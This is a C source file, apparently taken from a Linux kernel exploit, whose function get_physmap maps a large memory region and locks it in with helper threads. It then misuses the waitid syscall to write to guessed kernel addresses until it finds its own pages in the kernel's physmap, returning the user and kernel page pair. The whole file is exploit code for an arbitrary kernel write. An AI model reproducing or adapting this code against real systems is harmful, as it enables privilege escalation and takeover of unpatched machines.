#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct PagePair {unsigned long userland_page; unsigned long kernel_page; } ;
typedef  int /*<<< orphan*/  pthread_t ;

/* Variables and functions */
 int MAP_ANONYMOUS ; 
 int MAP_FIXED ; 
 int MAP_SHARED ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int /*<<< orphan*/  P_ALL ; 
 int /*<<< orphan*/  SYS_waitid ; 
 int /*<<< orphan*/  WEXITED ; 
 int done_locking ; 
 int errno ; 
 int /*<<< orphan*/  exit (int) ; 
 char* mapping_base ; 
 int mapping_begin ; 
 long* mapping_changed () ; 
 int /*<<< orphan*/  memset (long*,int,int) ; 
 int /*<<< orphan*/  mlock_thread ; 
 long* mmap (void*,int,int,int,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 scalar_t__ pthread_create (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int syscall (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,...) ; 

void get_physmap(struct PagePair *pp) {
  // mmap a large amount of memory
  // have one thread watch for changes, while we try overwriting it in the kernel's physmap
  // lock the page in when it's found
  unsigned long base = 0x100000000;
  mapping_base = (char*)base;
  
  long* a = mmap((void*)base, 0x10000000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
  if ((long)a == -1) {
    printf("mmap failed\n");
    perror("mmap");
    exit(-1);
  }
  printf("mapped %p\n", a);
  memset(a, 0x41, 0x10000000);

  done_locking = 0;
  int j = 0;
  for(j = 0; j < 4; j++) {
    pthread_t th1;
    if(pthread_create(&th1, NULL, mlock_thread, NULL)) {
      printf("mlock thread create error\n");
      exit(0);
    }
  }

  // try to find it in physmap
  unsigned long curr_guess = mapping_begin-0x80000000;
  printf("trying to find physmap mapping\n");
  while(1) {
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno != 14) {
      printf("found mapping at %p\n", (void*)curr_guess);
      curr_guess += 0x80000000;
      break;
    }
    curr_guess += 0x10000000;
  }
  // try to find physmap
  long *locked_mapping = NULL;
  long *locked_kernel_mapping = NULL;
  while(1) {
    // this has 6 0's to ensure that we end up with an address containing only 5 non-zero vals
    curr_guess += 0x1000000;
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess, WEXITED, NULL);
    if (locked_mapping = mapping_changed()) {
      locked_kernel_mapping = (long*)curr_guess;
      printf("detected change at %p\n", (void*)curr_guess);
      break;
    }
  }
  
  // verify lock worked
  locked_mapping[0] = 0x41414141;
  syscall(SYS_waitid, P_ALL, 0, locked_kernel_mapping, WEXITED, NULL);
  syscall(SYS_waitid, P_ALL, 0, &locked_kernel_mapping[100], WEXITED, NULL);
  if (locked_mapping[0] != 0 || locked_mapping[100] != 0) {
    printf("second write didn't work...");
  }
  printf("physmap addr is good\n");
  if(pp) {
    pp->userland_page = (unsigned long)locked_mapping;
    pp->kernel_page = (unsigned long)locked_kernel_mapping;
  }
  done_locking = 1;

}